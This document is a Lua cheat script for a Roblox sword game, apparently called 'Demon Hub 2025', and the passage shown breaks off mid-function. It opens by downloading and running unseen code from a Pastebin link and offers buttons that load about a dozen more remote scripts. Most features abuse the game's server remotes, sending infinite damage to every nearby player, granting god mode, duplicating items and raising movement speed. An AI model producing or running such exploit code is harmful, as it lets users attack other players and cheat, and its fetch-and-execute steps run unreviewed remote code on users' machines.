--[[


██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗  ██╗░░██╗██╗░░░██╗██████╗░  ██╗░░░██╗██████╗░
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║  ██║░░██║██║░░░██║██╔══██╗  ██║░░░██║╚════██╗
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║  ███████║██║░░░██║██████╦╝  ╚██╗░██╔╝░█████╔╝
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║  ██╔══██║██║░░░██║██╔══██╗  ░╚████╔╝░░╚═══██╗
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║  ██║░░██║╚██████╔╝██████╦╝  ░░╚██╔╝░░██████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░  ░░░╚═╝░░░╚═════╝░

██████╗░░█████╗░██████╗░███████╗
╚════██╗██╔══██╗╚════██╗██╔════╝
░░███╔═╝██║░░██║░░███╔═╝██████╗░
██╔══╝░░██║░░██║██╔══╝░░╚════██╗
███████╗╚█████╔╝███████╗██████╔╝
╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
--]]

-- Get and run remote script from Pastebin
local url = "https://pastebin.com/raw/cbBsFWLF"
local response = game:HttpGet(url)
local func = loadstring(response)
func()
task.wait(1)

--[[
╔════════════════════════════════════════════════════════════════════╗
║              🜲 DEMON HUB 2025 - CORRUPT CORE EDITION 🜲             ║
║                          ⟐ Version: V4.1 ⟐                         ║
║             ⚠️ CORRUPTED & CRAFTED WITH CHAOS BY AlznDev ⚠️        ║
╚════════════════════════════════════════════════════════════════════╝
]]

-- ════════════════ [1] CONFIGURATION & CONSTANTS ════════════════
local CONFIG = {
    VERSION = "4.1",
    NOTIFICATION_SOUND = "rbxassetid://570433034",
    UI_LIBRARY_URL = "https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt",
    
    THEME = {
        PRIMARY_COLOR = Color3.fromRGB(138, 43, 226),   -- Blue Violet
        SECONDARY_COLOR = Color3.fromRGB(75, 0, 130),   -- Indigo
        ACCENT_COLOR = Color3.fromRGB(30, 144, 255)     -- Dodger Blue
    },
    
    DEFAULTS = {
        KILL_AURA_RANGE = 40,
        WALK_SPEED = 16,
        JUMP_POWER = 50,
        SWORD_SPIN_SPEED = 2,
        SWORD_SPIN_DISTANCE = 6
    }
}

-- ════════════════ [2] CORE SERVICES ════════════════
local Services = {
    Players = game:GetService("Players"),
    RunService = game:GetService("RunService"),
    SoundService = game:GetService("SoundService"),
    UserInputService = game:GetService("UserInputService"),
    TweenService = game:GetService("TweenService"),
    Debris = game:GetService("Debris"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    StarterGui = game:GetService("StarterGui"),
    HttpService = game:GetService("HttpService")
}

-- ════════════════ [3] PLAYER REFERENCES ════════════════
local LocalPlayer = Services.Players.LocalPlayer
local Character, Humanoid, RootPart

-- Safe character initialization
local function initializeCharacter()
    Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    Humanoid = Character:WaitForChild("Humanoid")
    RootPart = Character:WaitForChild("HumanoidRootPart")
end

-- Initialize character on script start
initializeCharacter()

-- Reinitialize on character respawn
LocalPlayer.CharacterAdded:Connect(initializeCharacter)

-- State Management
local States = {
    SlowFarm = false,
    FastFarm = false,
    KillAura = false,
    GrabTools = false,
    KillAll = false,
    PermaGod = false,
    WalkSpeedLoop = false,
    AutoDropTools = false
}

-- Connections Storage
local Connections = {}

-- ════════════════ [4] UTILITY FUNCTIONS ════════════════
local Utils = {}

-- 4.1 Safe function execution with error handling
function Utils.SafeExecute(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        warn("[Demon Hub] Error:", result)
        return false, result
    end
    return true, result
end

-- 4.2 Enhanced notification system
function Utils.Notify(title, text, duration)
    Utils.SafeExecute(function()
        Services.StarterGui:SetCore("SendNotification", {
            Title = title or "Demon Hub",
            Text = text or "",
            Duration = duration or 3
        })
    end)
end

-- 4.3 Play sound with cleanup
function Utils.PlaySound(soundId, volume, callback)
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Volume = volume or 1
    sound.Parent = Services.SoundService

    local connection
    connection = sound.Ended:Connect(function()
        sound:Destroy()
        if connection then connection:Disconnect() end
        if callback then callback() end
    end)

    sound:Play()
    return sound
end

-- 4.4 Get character safely
function Utils.GetCharacter()
    return LocalPlayer.Character
end

-- 4.5 Get humanoid safely
function Utils.GetHumanoid()
    local char = Utils.GetCharacter()
    return char and char:FindFirstChildOfClass("Humanoid")
end

-- 4.6 Get root part safely
function Utils.GetRootPart()
    local char = Utils.GetCharacter()
    return char and char:FindFirstChild("HumanoidRootPart")
end

-- 4.7 Load external script safely
function Utils.LoadScript(url)
    Utils.SafeExecute(function()
        local success, script = pcall(game.HttpGet, game, url, true)
        if success then
            loadstring(script)()
        else
            Utils.Notify("Script Error", "Failed to load: " .. url, 3)
        end
    end)
end

-- 4.8 Disconnect connection safely
function Utils.DisconnectConnection(connectionName)
    if Connections[connectionName] then
        Connections[connectionName]:Disconnect()
        Connections[connectionName] = nil
        return true
    end
    return false
end

-- 4.9 Validate tool
function Utils.ValidateTool(tool)
    return tool and tool:IsA("Tool") and tool:FindFirstChild("Handle")
end

-- ════════════════ [5] INITIALIZATION ════════════════
-- Play startup sound
Utils.PlaySound(CONFIG.NOTIFICATION_SOUND, 1, function()
    Utils.Notify("Demon Hub 2025", "Successfully loaded v" .. CONFIG.VERSION, 5)
end)

-- Load UI Library with error handling
local UILib, Window, MainServer, Tabs

Utils.SafeExecute(function()
    UILib = loadstring(game:HttpGet(CONFIG.UI_LIBRARY_URL))()
    Window = UILib:Window("Demon Hub 2025 | CORRUPT CORE v" .. CONFIG.VERSION)
    MainServer = Window:Server("Scripts", "")

    -- Create UI Tabs
    Tabs = {
        Main = MainServer:Channel("Main"),
        Character = MainServer:Channel("Character"),
        Effects = MainServer:Channel("Effects"),
        Scripts = MainServer:Channel("Scripts"),
        Toggles = MainServer:Channel("Toggles"),
        UI = MainServer:Channel("UI"),
        Teleports = MainServer:Channel("Teleports"),
        Power = MainServer:Channel("Power"),
        Worlds = MainServer:Channel("Worlds"),
        Music = MainServer:Channel("Music"),
        Settings = MainServer:Channel("Settings")
    }
end)

if not Tabs then
    Utils.Notify("Error", "Failed to load UI. Script may not function properly.", 5)
    return
end

-- ════════════════ [6] CORE FUNCTIONS ════════════════
local Core = {}

-- 6.1 Enhanced Sword Remote Firing
function Core.FireSwordRemote(times, delay)
    local char = Utils.GetCharacter()
    if not char then return false end
    
    local sword = char:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
    if not Utils.ValidateTool(sword) then return false end
    
    local handle = sword:FindFirstChild("Handle")
    local up = handle and handle:FindFirstChild("up")
    local remoteEvent = up and up:FindFirstChild("RemoteEvent")
    
    if not remoteEvent then return false end
    
    for i = 1, times do
        Utils.SafeExecute(function()
            remoteEvent:FireServer()
        end)
        if delay then task.wait(delay) end
    end
    
    return true
end

-- 6.2 Get all swords with improved caching
local swordCache = {}
local cacheTime = 0
local CACHE_DURATION = 2 -- seconds

function Core.GetSwords(useCache)
    local currentTime = tick()
    
    if useCache and #swordCache > 0 and (currentTime - cacheTime) < CACHE_DURATION then
        return swordCache
    end
    
    swordCache = {}
    local char = Utils.GetCharacter()
    local backpack = LocalPlayer.Backpack
    
    for _, container in ipairs({backpack, char}) do
        if container then
            for _, tool in ipairs(container:GetChildren()) do
                if Utils.ValidateTool(tool) and tool.Name:lower():find("sword") then
                    table.insert(swordCache, tool)
                end
            end
        end
    end
    
    cacheTime = currentTime
    return swordCache
end

-- 6.3 Enhanced Kill Aura System
function Core.KillAuraSystem()
    local range = CONFIG.DEFAULTS.KILL_AURA_RANGE
    local killAuraActive = true
    
    -- Create range slider if tabs exist
    if Tabs and Tabs.Main then
        Tabs.Main:Slider("Kill Aura Range", 10, 1000, range, function(value)
            range = value
        end)
    end
    
    -- Find and setup sword
    local function setupSword()
        local swords = Core.GetSwords(true)
        if #swords == 0 then return nil end
        
        local sword = swords[1]
        local hum = Utils.GetHumanoid()
        
        if sword.Parent == LocalPlayer.Backpack and hum then
            hum:EquipTool(sword)
            task.wait(0.1)
        end
        
        return sword
    end
    
    -- Main kill aura loop
    Connections.KillAura = Services.RunService.Heartbeat:Connect(function()
        if not killAuraActive or not States.KillAura then return end
        
        local sword = setupSword()
        if not sword then return end
        
        local handle = sword:FindFirstChild("Handle")
        local dmg = handle and handle:FindFirstChild("dmg")
        local remote = dmg and dmg:FindFirstChild("RemoteEvent")
        
        if not remote then return end
        
        local myRoot = Utils.GetRootPart()
        if not myRoot then return end
        
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                local targetHum = player.Character:FindFirstChild("Humanoid")
                
                if targetRoot and targetHum and targetHum.Health > 0 then
                    local distance = (myRoot.Position - targetRoot.Position).Magnitude
                    if distance <= range then
                        Utils.SafeExecute(function()
                            remote:FireServer(targetHum, math.huge)
                        end)
                    end
                end
            end
        end
    end)
    
    -- Toggle keybind
    Services.UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.E then
            killAuraActive = not killAuraActive
            Utils.Notify("Kill Aura", killAuraActive and "Activated" or "Deactivated", 2)
        end
    end)
end

-- ════════════════ [7] FARMING SYSTEM ════════════════
-- 7.1 Slow Farm
if Tabs and Tabs.Main then
    Tabs.Main:Button("Start Slow Farm", function()
        States.SlowFarm = true
        Utils.Notify("Farming", "Slow Farm activated", 2)
        
        task.spawn(function()
            while States.SlowFarm do
                if not Core.FireSwordRemote(4, 0.04) then
                    task.wait(1) -- Wait if no sword found
                end
                task.wait()
            end
        end)
    end)

    Tabs.Main:Button("Stop Slow Farm", function()
        States.SlowFarm = false
        Utils.Notify("Farming", "Slow Farm deactivated", 2)
    end)

    -- 7.2 Fast Farm
    Tabs.Main:Button("Start Fast Farm", function()
        States.FastFarm = true
        Utils.Notify("Farming", "Fast Farm activated", 2)
        
        if not Connections.FastFarm then
            Connections.FastFarm = Services.RunService.Stepped:Connect(function()
                if States.FastFarm then
                    Core.FireSwordRemote(6)
                end
            end)
        end
    end)

    Tabs.Main:Button("Stop Fast Farm", function()
        States.FastFarm = false
        Utils.DisconnectConnection("FastFarm")
        Utils.Notify("Farming", "Fast Farm deactivated", 2)
    end)

    -- ════════════════ [8] MAIN FEATURES ════════════════
    -- 8.1 Kill Aura
    Tabs.Main:Button("Activate Kill Aura", function()
        if States.KillAura then return end
        States.KillAura = true
        Core.KillAuraSystem()
        Utils.Notify("Combat", "Kill Aura system initialized", 3)
    end)

    -- 8.2 Sword Damage Script
    Tabs.Main:Button("Instant Kill Sword Damage", function()
        local swords = Core.GetSwords()
        local count = 0
        
        for _, sword in ipairs(swords) do
            Utils.SafeExecute(function()
                if not Utils.ValidateTool(sword) then return end
                
                sword.Parent = LocalPlayer.Backpack
                sword.Handle.Massless = true
                sword.Handle.CanCollide = true
                sword.Parent = Character
                
                sword.Handle.Touched:Connect(function(hit)
                    local targetHum = hit.Parent and hit.Parent:FindFirstChild("Humanoid")
                    if targetHum and hit.Parent ~= Character then
                        local dmg = sword.Handle:FindFirstChild("dmg")
                        local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                        if remote then
                            Utils.SafeExecute(function()
                                remote:FireServer(targetHum, math.huge)
                            end)
                        end
                    end
                end)
                
                count = count + 1
            end)
        end
        
        Utils.Notify("Combat", "Instant Kill: " .. count .. " Sword(s)", 3)
    end)

    -- 8.3 Infinite Yield
    Tabs.Main:Button("Load Infinite Yield", function()
        Utils.LoadScript("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
    end)
end

-- ════════════════ [9] CHARACTER MODIFICATIONS ════════════════
local Movement = {
    WalkSpeed = CONFIG.DEFAULTS.WALK_SPEED,
    JumpPower = CONFIG.DEFAULTS.JUMP_POWER
}

if Tabs and Tabs.Character then
    -- 9.1 Movement controls with validation
    Tabs.Character:Slider("Walk Speed", 0, 500, Movement.WalkSpeed, function(value)
        Movement.WalkSpeed = value
        local hum = Utils.GetHumanoid()
        if hum then hum.WalkSpeed = value end
    end)

    Tabs.Character:Slider("Jump Power", 0, 500, Movement.JumpPower, function(value)
        Movement.JumpPower = value
        local hum = Utils.GetHumanoid()
        if hum then hum.JumpPower = value end
    end)

    -- 9.2 Quick Speed Buttons
    local speedPresets = {
        {name = "Normal Speed", speed = 16, jump = 50},
        {name = "Fast Speed", speed = 100, jump = 100},
        {name = "Super Speed", speed = 250, jump = 150},
        {name = "Godspeed", speed = 500, jump = 200}
    }

    for _, preset in ipairs(speedPresets) do
        Tabs.Character:Button(preset.name, function()
            Movement.WalkSpeed = preset.speed
            Movement.JumpPower = preset.jump
            local hum = Utils.GetHumanoid()
            if hum then
                hum.WalkSpeed = preset.speed
                hum.JumpPower = preset.jump
            end
            Utils.Notify("Movement", preset.name .. " activated", 2)
        end)
    end

    -- 9.3 Enhanced Respawn
    Tabs.Character:Button("Smart Respawn", function()
        local char = Utils.GetCharacter()
        local root = Utils.GetRootPart()
        if not char or not root then return end
        
        local pos = root.CFrame
        local hum = Utils.GetHumanoid()
        
        if hum then
            hum.Health = 0
            LocalPlayer.CharacterAdded:Wait()
            task.wait(0.2)
            
            initializeCharacter() -- Reinitialize references
            local newRoot = Utils.GetRootPart()
            if newRoot then
                newRoot.CFrame = pos
                Utils.Notify("Respawn", "Respawned at saved position", 2)
            end
        end
    end)

    -- 9.4 God Mode System
    Tabs.Character:Button("Activate God Mode", function()
        local hum = Utils.GetHumanoid()
        if not hum then return end
        
        local sword = Character:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
        if Utils.ValidateTool(sword) then
            local dmg = sword.Handle:FindFirstChild("dmg")
            local remote = dmg and dmg:FindFirstChild("RemoteEvent")
            if remote then
                Utils.SafeExecute(function()
                    remote:FireServer(hum, -math.huge)
                    Utils.Notify("God Mode", "Activated successfully", 3)
                end)
            end
        end
    end)

    -- 9.5 Fixed Perma God Toggle
    Tabs.Character:Toggle("Permanent God Mode", false, function(state)
        States.PermaGod = state
        
        if state then
            -- Main god mode healing loop
            task.spawn(function()
                while States.PermaGod do
                    Utils.SafeExecute(function()
                        local hum = Utils.GetHumanoid()
                        local char = Utils.GetCharacter()
                        local sword = char and (char:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword"))
                        
                        if hum and Utils.ValidateTool(sword) then
                            local dmg = sword.Handle:FindFirstChild("dmg")
                            local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                            if remote then
                                remote:FireServer(hum, -math.huge)
                            end
                        end
                        
                        -- Backup health protection
                        if hum then
                            hum.Health = math.max(hum.Health, hum.MaxHealth)
                        end
                    end)
                    task.wait(0.1)
                end
            end)
            
            -- Prevent external tool pickup
            task.spawn(function()
                while States.PermaGod do
                    Utils.SafeExecute(function()
                        local char = Utils.GetCharacter()
                        if char then
                            for _, tool in pairs(char:GetChildren()) do
                                if tool:IsA("Tool") and tool.Name ~= "sword" then
                                    tool.Parent = LocalPlayer.Backpack
                                    task.wait(0.1)
                                    if tool.Parent == LocalPlayer.Backpack then
                                        tool.Parent = workspace
                                    end
                                end
                            end
                        end
                    end)
                    task.wait(0.2)
                end
            end)
            
            -- Hook into tool added events
            local char = Utils.GetCharacter()
            if char then
                local toolConnection = char.ChildAdded:Connect(function(child)
                    if States.PermaGod and child:IsA("Tool") and child.Name ~= "sword" then
                        task.wait(0.1)
                        if child.Parent == char then
                            child.Parent = workspace
                        end
                    end
                end)
                
                States.ToolConnection = toolConnection
            end
            
        else
            -- Cleanup when disabled
            if States.ToolConnection then
                States.ToolConnection:Disconnect()
                States.ToolConnection = nil
            end
        end
    end)
end

-- ════════════════ [10] EFFECTS SYSTEM ════════════════
local Effects = {}

-- Apply flame colors with smooth transitions
function Effects.ApplyFlameColors(colors, loops)
    Utils.SafeExecute(function()
        local eff = workspace:FindFirstChild("eff")
        if not eff then return end
        
        local event = eff:FindFirstChild("RemoteEvent")
        if not event then return end
        
        for i = 1, loops do
            for _, color in ipairs(colors) do
                event:FireServer(color)
                task.wait(0.0001)
            end
        end
    end)
end

-- Enhanced spawn and drop
function Effects.SpawnAndDrop()
    Utils.SafeExecute(function()
        if workspace:FindFirstChild("load") and workspace.load:FindFirstChild("RemoteEvent") then
            workspace.load.RemoteEvent:FireServer()
            task.wait(0.21)

            -- Equip all tools
            for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
                if Utils.ValidateTool(tool) then
                    tool.Parent = Character
                end
            end

            -- Drop with tag
            for _, tool in pairs(Character:GetChildren()) do
                if Utils.ValidateTool(tool) then
                    tool.Parent = workspace
                    local tag = Instance.new("StringValue")
                    tag.Name = "DemonHubTag"
                    tag.Parent = tool
                end
            end
        end
    end)
end

-- Cleanup system
function Effects.Cleanup()
    for _, tool in pairs(workspace:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("DemonHubTag") then
            tool:FindFirstChild("DemonHubTag"):Destroy()
        end
    end
end

-- Define flame effect configurations
local flameEffects = {
    -- Single color flames
    {name = "Purple Inferno", colors = {"Purple"}},
    {name = "Crimson Blaze", colors = {"Red"}},
    {name = "Shadow Flame", colors = {"Black"}},
    {name = "Azure Fire", colors = {"Blue"}},
    
    -- Dual color combinations
    {name = "Twilight Fury", colors = {"Purple", "Red"}},
    {name = "Mystic Frost", colors = {"Purple", "Blue"}},
    {name = "Eclipse Shadow", colors = {"Purple", "Black"}},
    {name = "Storm Blaze", colors = {"Red", "Blue"}},
    {name = "Obsidian Fire", colors = {"Black", "Red"}},
    {name = "Abyssal Storm", colors = {"Black", "Blue"}},
    
    -- Triple color combinations
    {name = "Trinity Flame", colors = {"Red", "Purple", "Blue"}},
    {name = "Dark Trinity", colors = {"Black", "Red", "Purple"}},
    {name = "Void Radiance", colors = {"Black", "Blue", "Purple"}},
    {name = "Crimson Void", colors = {"Red", "Black", "Blue"}},
    
    -- Quad color combination
    {name = "Chaos Inferno", colors = {"Red", "Blue", "Purple", "Black"}},
    {name = "Ultimate Blaze", colors = {"Red", "Purple", "Blue", "Black"}}
}

local DESIRED_DUPE_COUNT = 25
local COLOR_LOOP_PER_DUPE = 3

if Tabs and Tabs.Effects then
    for _, effect in ipairs(flameEffects) do
        Tabs.Effects:Button(effect.name, function()
            Utils.Notify("Effects", "Applying " .. effect.name, 2)
            for i = 1, DESIRED_DUPE_COUNT do
                Effects.ApplyFlameColors(effect.colors, COLOR_LOOP_PER_DUPE)
                task.wait(0.0001)
                Effects.SpawnAndDrop()
            end
            Effects.Cleanup()
            Utils.Notify("Effects", effect.name .. " completed", 3)
        end)
    end
end

-- ════════════════ [11] EXTERNAL SCRIPTS ════════════════
local externalScripts = {
    {name = "Exclusive Hub", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Exclusive%20Hub.lua"},
    {name = "2take1.tk", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/2take1"},
    {name = "Sword Simulator Hub", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Sword%20Simulator%20Hub"},
    {name = "Liquids GUI", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Liquid's%20Gui"},
    {name = "Auratus X Hub", url = "https://raw.githubusercontent.com/AnimatedKurai/Scripts/refs/heads/main/Auratus%20Hub.txt"},
    {name = "Replication UI", url = "https://raw.githubusercontent.com/EEND2SCRIPTS/Replication/main/replication"},
    {name = "Emperor Wings", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Emperor%20Wings.lua"},
    {name = "Ghost Hub", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Ghost_Hub"},
    {name = "Dragon Hub Premium", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/main/Dragon%2520Hub"},
    {name = "Slayer Hub", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/main/Truecode"},
    {name = "Line's Script Hub", url = "https://raw.githubusercontent.com/Zacky-pixel-sketch/Hubs/main/Demon%20hub%20source%20code.lua"}
}

if Tabs and Tabs.Scripts then
    for _, script in ipairs(externalScripts) do
        Tabs.Scripts:Button(script.name, function()
            Utils.LoadScript(script.url)
        end)
    end

-- ════════════════ [12] ADVANCED SWORD STYLES ════════════════
-- 12.1 Enhanced Dynamic Sword Spin

-- Configuration
local SWORD_SPIN_CONFIG = {
    SPIN_SPEED = CONFIG.DEFAULTS.SWORD_SPIN_SPEED or 5,
    SPIN_DISTANCE = CONFIG.DEFAULTS.SWORD_SPIN_DISTANCE or 8,
    VERTICAL_AMPLITUDE = 2,
    VERTICAL_FREQUENCY = 2,
    BODY_POSITION_FORCE = Vector3.new(1e5, 1e5, 1e5),
    BODY_POSITION_P = 3000,
    BODY_POSITION_D = 500,
    ANGULAR_VELOCITY = Vector3.new(0, 10, 0),
    ANGULAR_TORQUE = Vector3.new(1e5, 1e5, 1e5)
}

-- Sword Spinner Class
local SwordSpinner = {}
SwordSpinner.__index = SwordSpinner

function SwordSpinner.new()
    local self = setmetatable({}, SwordSpinner)
    self.isSpinning = false
    self.angleOffset = 0
    self.spinSwords = {}
    self.originalSwords = {}
    self.connections = {}
    return self
end

function SwordSpinner:validateAndCloneSwords()
    local swords = Core.GetSwords()
    if #swords == 0 then
        return false, "No swords found"
    end
    
    local clonedCount = 0
    for _, sword in ipairs(swords) do
        if Utils.ValidateTool(sword) then
            local success, clone = pcall(function()
                return sword:Clone()
            end)
            
            if success and clone then
                table.insert(self.originalSwords, sword)
                clone.Name = sword.Name .. "_Spinning"
                clone.Parent = workspace
                
                local handle = clone:FindFirstChild("Handle")
                if handle then
                    self:setupSwordPhysics(clone, handle)
                    clonedCount = clonedCount + 1
                end
                
                -- Hide original sword
                sword.Parent = nil
            end
        end
    end
    
    if clonedCount == 0 then
        return false, "Failed to clone any valid swords"
    end
    
    return true, "Successfully prepared " .. clonedCount .. " swords"
end

function SwordSpinner:setupSwordPhysics(sword, handle)
    -- Configure handle physics
    handle.Massless = true
    handle.CanCollide = false
    
    -- Create BodyPosition for movement
    local bodyPos = Instance.new("BodyPosition")
    bodyPos.MaxForce = SWORD_SPIN_CONFIG.BODY_POSITION_FORCE
    bodyPos.P = SWORD_SPIN_CONFIG.BODY_POSITION_P
    bodyPos.D = SWORD_SPIN_CONFIG.BODY_POSITION_D
    bodyPos.Parent = handle
    
    -- Create BodyAngularVelocity for rotation
    local bodyAngVel = Instance.new("BodyAngularVelocity")
    bodyAngVel.MaxTorque = SWORD_SPIN_CONFIG.ANGULAR_TORQUE
    bodyAngVel.AngularVelocity = SWORD_SPIN_CONFIG.ANGULAR_VELOCITY
    bodyAngVel.Parent = handle
    
    -- Store sword data
    table.insert(self.spinSwords, {
        sword = sword,
        handle = handle,
        bodyPos = bodyPos,
        bodyAngVel = bodyAngVel
    })
end

function SwordSpinner:updateSwordPositions(deltaTime)
    self.angleOffset = self.angleOffset + deltaTime * SWORD_SPIN_CONFIG.SPIN_SPEED
    
    local root = Utils.GetRootPart()
    if not root then
        self:stop()
        return
    end
    
    local swordCount = #self.spinSwords
    for i, data in ipairs(self.spinSwords) do
        -- Check if sword still exists
        if data.sword and data.sword.Parent then
            -- Calculate circular position
            local angle = (2 * math.pi / swordCount) * (i - 1) + self.angleOffset
            
            -- Add vertical wave motion
            local verticalOffset = SWORD_SPIN_CONFIG.VERTICAL_AMPLITUDE * 
                                  math.sin(self.angleOffset * SWORD_SPIN_CONFIG.VERTICAL_FREQUENCY + i)
            
            local offset = Vector3.new(
                SWORD_SPIN_CONFIG.SPIN_DISTANCE * math.sin(angle),
                verticalOffset,
                SWORD_SPIN_CONFIG.SPIN_DISTANCE * math.cos(angle)
            )
            
            data.bodyPos.Position = root.Position + offset
        end
    end
end

function SwordSpinner:start()
    if self.isSpinning then
        Utils.Notify("Sword Spin", "Already spinning!", 2)
        return
    end
    
    local success, message = self:validateAndCloneSwords()
    if not success then
        Utils.Notify("Error", message, 2)
        return
    end
    
    self.isSpinning = true
    
    -- Main update loop
    self.connections.heartbeat = Services.RunService.Heartbeat:Connect(function(dt)
        if not self.isSpinning then return end
        self:updateSwordPositions(dt)
    end)
    
    -- Input handling
    self.connections.input = Services.UserInputService.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        if input.KeyCode == Enum.KeyCode.X then
            self:stop()
        end
    end)
    
    -- Stop when player dies
    local humanoid = Utils.GetHumanoid()
    if humanoid then
        self.connections.died = humanoid.Died:Connect(function()
            self:stop()
        end)
    end
    
    -- Character removal handling
    local character = Utils.GetCharacter()
    if character then
        self.connections.ancestryChanged = character.AncestryChanged:Connect(function()
            if not character.Parent then
                self:stop()
            end
        end)
    end
    
    Utils.Notify("Sword Spin", 
        "Active! Press X to stop | " .. #self.spinSwords .. " swords spinning", 3)
end

function SwordSpinner:stop()
    if not self.isSpinning then return end
    
    self.isSpinning = false
    
    -- Disconnect all connections
    for _, connection in pairs(self.connections) do
        if connection then
            connection:Disconnect()
        end
    end
    self.connections = {}
    
    -- Clean up spinning swords
    for _, data in ipairs(self.spinSwords) do
        if data.sword then
            data.sword:Destroy()
        end
    end
    
    -- Restore original swords
    local character = Utils.GetCharacter()
    if character then
        for _, sword in ipairs(self.originalSwords) do
            if sword and sword.Parent == nil then
                sword.Parent = character
            end
        end
    end
    
    -- Reset state
    self.spinSwords = {}
    self.originalSwords = {}
    self.angleOffset = 0
    
    Utils.Notify("Sword Spin", "Deactivated", 2)
end

-- Global spinner instance
local currentSpinner = nil

-- Main button implementation
Tabs.Scripts:Button("Dynamic Sword Spin", function()
    -- Stop existing spinner if running
    if currentSpinner then
        currentSpinner:stop()
    end
    
    -- Create and start new spinner
    currentSpinner = SwordSpinner.new()
    currentSpinner:start()
end)

-- Optional: Add stop button for convenience
Tabs.Scripts:Button("Stop Sword Spin", function()
    if currentSpinner then
        currentSpinner:stop()
        currentSpinner = nil
    else
        Utils.Notify("Sword Spin", "No active spinner to stop", 2)
    end
end)
    -- 12.2 Sword Halo
    Tabs.Scripts:Button("Sword Halo", function()
        local swords = Core.GetSwords()
        if #swords == 0 then 
            Utils.Notify("Error", "No swords found", 2)
            return 
        end
        
        local char = Utils.GetCharacter()
        local head = char and char:FindFirstChild("Head")
        if not head then return end
        
        local radius = 5
        local height = head.Size.Y / 2 + 3
        local angleStep = 2 * math.pi / #swords
        
        for i, sword in ipairs(swords) do
            if Utils.ValidateTool(sword) then
                sword.Parent = char
                local angle = angleStep * (i - 1)
                local offset = CFrame.new(math.cos(angle) * radius, height, math.sin(angle) * radius)
                local rotation = CFrame.Angles(0, angle, math.rad(90))
                sword.Grip = char.PrimaryPart.CFrame:Inverse() * head.CFrame * offset * rotation
            end
        end
        
        Utils.Notify("Sword Style", "Halo applied to " .. #swords .. " swords", 2)
    end)

    -- 12.3 Advanced Sword Formation
    Tabs.Scripts:Button("Matrix Formation", function()
        local swords = Core.GetSwords()
        if #swords == 0 then 
            Utils.Notify("Error", "No swords found", 2)
            return 
        end
        
        local formations = {
            -- Front formation
            CFrame.new(-2.4, 2.3, 2.3) * CFrame.Angles(0, 0, math.rad(-45)),
            CFrame.new(0, 2.3, 3.1),
            CFrame.new(2.4, 2.3, 2.3) * CFrame.Angles(0, 0, math.rad(45)),
            -- Middle formation
            CFrame.new(-2.4, 0, 3.1) * CFrame.Angles(0, 0, math.rad(-25)),
            CFrame.new(0, 0, 3.6),
            CFrame.new(2.4, 0, 3.1) * CFrame.Angles(0, 0, math.rad(25)),
            -- Lower formation
            CFrame.new(-2.4, -2.3, 2.3) * CFrame.Angles(0, 0, math.rad(-45)),
            CFrame.new(0, -2.3, 3.1),
            CFrame.new(2.4, -2.3, 2.3) * CFrame.Angles(0, 0, math.rad(45)),
            -- Back formation
            CFrame.new(2.4, 2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(-45)),
            CFrame.new(0, 2.3, -3.1) * CFrame.Angles(0, math.rad(180), 0),
            CFrame.new(-2.4, 2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(45)),
            -- Back middle
            CFrame.new(2.4, 0, -3.1) * CFrame.Angles(0, math.rad(180), math.rad(-25)),
            CFrame.new(0, 0, -3.6) * CFrame.Angles(0, math.rad(180), 0),
            CFrame.new(-2.4, 0, -3.1) * CFrame.Angles(0, math.rad(180), math.rad(25)),
            -- Back lower
            CFrame.new(2.4, -2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(-45)),
            CFrame.new(0, -2.3, -3.1) * CFrame.Angles(0, math.rad(180), 0),
            CFrame.new(-2.4, -2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(45))
        }
        
        local appliedCount = 0
        for i, sword in ipairs(swords) do
            local formation = formations[i]
            if not formation then break end
            
            if Utils.ValidateTool(sword) then
                sword.Parent = LocalPlayer.Backpack
                sword.Handle.Massless = true
                sword.Handle.CanCollide = false
                sword.Grip = formation
                sword.Parent = Character
                appliedCount = appliedCount + 1
            end
        end
        
        Utils.Notify("Sword Style", "Matrix formation applied to " .. appliedCount .. " swords", 2)
    end)
end

-- ════════════════ [13] TOGGLE FEATURES ════════════════
if Tabs and Tabs.Toggles then
    -- 13.1 Auto Grab Tools
    Tabs.Toggles:Toggle("Auto Grab Tools", false, function(state)
        States.GrabTools = state
        
        Utils.DisconnectConnection("GrabTools")
        
        if state then
            Connections.GrabTools = Services.RunService.Heartbeat:Connect(function()
